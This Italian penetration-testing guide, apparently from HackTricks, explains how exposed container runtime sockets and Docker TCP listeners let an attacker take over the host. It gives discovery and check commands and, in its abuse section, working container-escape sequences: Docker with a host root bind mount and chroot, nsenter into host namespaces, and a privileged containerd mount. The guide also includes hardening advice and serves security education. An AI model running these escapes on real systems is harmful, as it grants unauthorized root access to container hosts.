# Runtime API e esposizione dei daemon

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Molte compromissioni reali di container non iniziano affatto con una fuga dal namespace. Iniziano con l'accesso al control plane del runtime. Se un workload può comunicare con `dockerd`, `containerd`, CRI-O, Podman o kubelet tramite un socket Unix montato o un listener TCP esposto, l'attaccante potrebbe essere in grado di richiedere un nuovo container con privilegi maggiori, montare il filesystem dell'host, unirsi ai namespace dell'host o recuperare informazioni sensibili sul nodo. In questi casi, l'API del runtime è il vero confine di sicurezza, e comprometterla è funzionalmente molto vicino a compromettere l'host.

Per questo l'esposizione del socket di runtime dovrebbe essere documentata separatamente dalle protezioni del kernel. Un container con seccomp, capabilities e MAC confinement ordinari può comunque trovarsi a una sola chiamata API dalla compromissione dell'host se `/var/run/docker.sock` o `/run/containerd/containerd.sock` è montato al suo interno. L'isolamento del kernel del container corrente potrebbe funzionare esattamente come progettato mentre il piano di gestione del runtime rimane completamente esposto.

## Modelli di accesso del daemon

Docker Engine tradizionalmente espone la sua API privilegiata tramite il socket Unix locale `unix:///var/run/docker.sock`. Storicamente è stata anche esposta in remoto tramite listener TCP come `tcp://0.0.0.0:2375` o un listener protetto da TLS su `2376`. Esporre il daemon in remoto senza TLS robusto e autenticazione client equivale praticamente a trasformare la Docker API in un'interfaccia root remota.

containerd, CRI-O, Podman e kubelet espongono superfici di impatto simile. I nomi e i workflow differiscono, ma la logica no. Se l'interfaccia permette al chiamante di creare workload, montare percorsi dell'host, recuperare credenziali o modificare container in esecuzione, l'interfaccia è un canale di gestione privilegiato e dovrebbe essere trattata di conseguenza.

I percorsi locali comuni da verificare sono:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stack più vecchi o più specializzati possono anche esporre endpoint come `dockershim.sock`, `frakti.sock` o `rktlet.sock`. Questi sono meno comuni negli ambienti moderni, ma quando vengono incontrati devono essere trattati con la stessa cautela perché rappresentano runtime-control surfaces piuttosto che ordinary application sockets.

## Accesso remoto sicuro

Se un daemon deve essere esposto oltre il local socket, la connessione dovrebbe essere protetta con TLS e preferibilmente con mutual authentication in modo che il daemon verifichi il client e il client verifichi il daemon. La vecchia abitudine di aprire il Docker daemon su plain HTTP per comodità è uno degli errori più pericolosi nell'amministrazione dei container perché la API surface è sufficientemente potente da creare privileged containers direttamente.

Il modello storico di configurazione di Docker era il seguente:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Su host basati su systemd, la comunicazione del demone può anche apparire come `fd://`, il che significa che il processo eredita una socket già aperta da systemd invece di effettuare il bind direttamente. La lezione importante non è la sintassi esatta ma la conseguenza per la sicurezza. Nel momento in cui il demone ascolta oltre una socket locale con permessi ristretti, la sicurezza del trasporto e l'autenticazione del client diventano obbligatorie piuttosto che misure opzionali di hardening.

## Abuso

Se è presente una socket di runtime, verifica quale sia, se esista un client compatibile e se sia possibile l'accesso raw HTTP o gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Questi comandi sono utili perché distinguono tra un percorso inesistente, una socket montata ma inaccessibile e un'API privilegiata attiva. Se il client riesce, la domanda successiva è se l'API può avviare un nuovo container con un host bind mount o host namespace sharing.

### Esempio completo: Docker Socket alla root dell'host

Se `docker.sock` è raggiungibile, la fuga classica consiste nell'avviare un nuovo container che monta il filesystem root dell'host e poi eseguire `chroot` al suo interno:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Questo fornisce l'esecuzione host-root diretta attraverso il Docker daemon. L'impatto non si limita alle letture di file. Una volta all'interno del nuovo container, l'attaccante può alterare i file dell'host, raccogliere credenziali, impiantare persistenza o avviare ulteriori workload privilegiati.

### Esempio completo: Docker Socket To Host Namespaces

Se l'attaccante preferisce l'accesso ai namespace invece dell'accesso limitato solo al filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Questa via raggiunge l'host chiedendo al runtime di creare un nuovo container con esposizione esplicita di host-namespace anziché sfruttare quello corrente.

### Esempio completo: containerd Socket

Un socket `containerd` montato è solitamente altrettanto pericoloso:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
L'impatto è di nuovo la compromissione dell'host. Anche se gli strumenti specifici di Docker sono assenti, un'altra API di runtime potrebbe comunque offrire lo stesso potere amministrativo.

## Checks

L'obiettivo di questi controlli è determinare se il container può raggiungere qualsiasi management plane che avrebbe dovuto rimanere al di fuori del confine di fiducia.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Quello che è interessante qui:

- Un socket del runtime montato è solitamente una primitiva amministrativa diretta piuttosto che una semplice disclosure di informazioni.
- Un listener TCP su `2375` senza TLS dovrebbe essere trattato come una condizione di compromissione remota.
- Variabili d'ambiente come `DOCKER_HOST` spesso rivelano che il workload è stato intenzionalmente progettato per parlare con il runtime dell'host.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` ascolta sul socket locale e il daemon è solitamente con privilegi di root | montaggio di `/var/run/docker.sock`, esposizione di `tcp://...:2375`, TLS debole o assente su `2376` |
| Podman | Daemonless CLI by default | Non è richiesto un daemon privilegiato a lunga durata per l'uso locale ordinario; API sockets possono comunque essere esposte quando `podman system service` è abilitato | esposizione di `podman.sock`, esecuzione estesa del servizio, utilizzo dell'API con privilegi di root |
| containerd | Local privileged socket | API amministrativa esposta tramite il socket locale e solitamente consumata da tooling di livello superiore | montaggio di `containerd.sock`, ampio accesso con `ctr` o `nerdctl`, esposizione di namespace privilegiati |
| CRI-O | Local privileged socket | L'endpoint CRI è pensato per componenti affidabili locali al nodo | montaggio di `crio.sock`, esposizione dell'endpoint CRI a workload non affidabili |
| Kubernetes kubelet | Node-local management API | Kubelet non dovrebbe essere ampiamente raggiungibile dai Pods; l'accesso può esporre lo stato dei pod, credenziali e funzionalità di esecuzione a seconda di authn/authz | montaggio di socket o certificati del kubelet, autenticazione kubelet debole, host networking più endpoint kubelet raggiungibile |
{{#include ../../../banners/hacktricks-training.md}}
